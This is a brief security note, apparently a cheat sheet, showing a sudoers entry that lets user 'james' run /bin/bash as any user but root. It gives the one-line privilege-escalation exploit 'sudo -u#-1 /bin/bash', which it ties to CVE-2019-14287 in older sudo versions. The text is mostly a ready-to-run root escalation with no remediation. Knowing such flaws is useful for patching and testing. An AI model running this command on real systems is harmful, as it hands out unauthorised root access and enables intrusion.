Security bypass in /etc/sudoers

# User privilege specification
root    ALL=(ALL:ALL) ALL
james ALL=(ALL,!root) /bin/bash
\
To exploit this configuration, use the following command line:

sudo -u#-1 /bin/bash
----------------------------

In the context of the command sudo -u#-1 /bin/bash, the string -u#-1 is a specific syntax used to exploit a high-severity security flaw (CVE-2019-14287) in older versions of the sudo utility
